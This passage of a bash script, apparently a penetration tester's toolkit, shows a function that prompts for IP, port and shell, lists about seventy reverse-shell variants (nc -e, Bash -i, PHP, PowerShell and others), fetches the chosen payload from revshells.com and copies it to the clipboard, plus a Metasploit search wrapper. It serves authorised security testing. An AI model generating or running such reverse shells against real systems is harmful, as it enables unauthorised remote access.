    local IP=${IP:-$(get_default_network_interface_ip)}

    logger info "[i] Port (Default: 9000): \c"
    read -r PORT
    local PORT=${PORT:-9000}

    local -a allowed_shell_types=("sh" "/bin/sh" "bash" "/bin/bash" "cmd" "powershell" "pwsh" "ash" "bsh" "csh" "ksh" "zsh" "pdksh" "tcsh" "mksh" "dash")

    function is_valid_shell_type() {
        local shell="$1"
        for valid_shell in "${allowed_shell_types[@]}"; do
            if [[ "$shell" == "$valid_shell" ]]; then
                return 0
            fi
        done
        return 1
    }

    while true; do
        logger info "[i] Enter Shell (Default: /bin/bash): \c"
        read -r SHELL_TYPE
        SHELL_TYPE=${SHELL_TYPE:-"/bin/bash"}

        if is_valid_shell_type "$SHELL_TYPE"; then
            break
        else
            logger error "[e] Invalid SHELL_TYPE. Allowed values are: ${allowed_shell_types[*]}"
        fi
    done

    # stripping color
    logger info ""

    local PS3="Please select the Mode (number): "
    local -a bash_options=( "Bash -i" "Bash 196" "Bash read line" "Bash 5" "Bash udp" "nc mkfifo" "nc -e" "nc.exe -e" "BusyBox nc -e" "nc -c" "ncat -e" "ncat.exe -e" "ncat udp" "curl" "rustcat" "C" "C Windows" "C# TCP Client" "C# Bash -i" "Haskell #1" "OpenSSL" "Perl" "Perl no sh" "Perl PentestMonkey" "PHP PentestMonkey" "PHP Ivan Sincek" "PHP cmd" "PHP cmd 2" "PHP cmd small" "PHP exec" "PHP shell_exec" "PHP system" "PHP passthru" "PHP \`" "PHP popen" "PHP proc_open" "Windows ConPty" "PowerShell #1" "PowerShell #2" "PowerShell #3" "PowerShell #4 (TLS)" "PowerShell #3 (Base64)" "Python #1" "Python #2" "Python3 #1" "Python3 #2" "Python3 Windows" "Python3 shortest" "Ruby #1" "Ruby no sh" "socat #1" "socat #2 (TTY)" "sqlite3 nc mkfifo" "node.js" "node.js #2" "Java #1" "Java #2" "Java #3" "Java Web" "Java Two Way" "Javascript" "Groovy" "telnet" "zsh" "Lua #1" "Lua #2" "Golang" "Vlang" "Awk" "Dart" "Crystal (system)" "Crystal (code)")

    local MODE
    select MODE in "${bash_options[@]}"; do
      if [[ -n "$MODE" ]]; then
        logger info "\n[i] Mode $MODE selected."
        local ENCODED_MODE=$(python3 -c "import urllib.parse; print(urllib.parse.quote('''$MODE'''))")
        break
      else
        logger error "[e] Invalid selection, please try again."
      fi
    done

    local ENCODED_SHELL=$(python3 -c "import urllib.parse; print(urllib.parse.quote('''$SHELL_TYPE'''))")
    local URL="https://www.revshells.com/${ENCODED_MODE}?ip=${IP}&port=${PORT}&shell=${ENCODED_SHELL}"
    local HTTP_STATUS=$(curl -s -o /dev/null -w "%{http_code}" "${URL}")

    if [[ "$HTTP_STATUS" -eq 200 ]]; then
        curl -s "${URL}" | xclip -selection clipboard
        logger info "[i] payload copied."
    else
        logger error "[e] Status $HTTP_STATUS"
    fi
}

# TODO: Doc
function url_encode() {
    local string="${1}"
    printf '%s' "${string}" | jq -sRr @uri
}

# TODO: DOc
function url_decode() {
    local string="${1//+/ }"
    printf '%s' "$string" | perl -MURI::Escape -ne 'print uri_unescape($_)'
}

function msfsearch() {
    msfconsole -q -x "search $@; exit"
}

spawn_session_in_workspace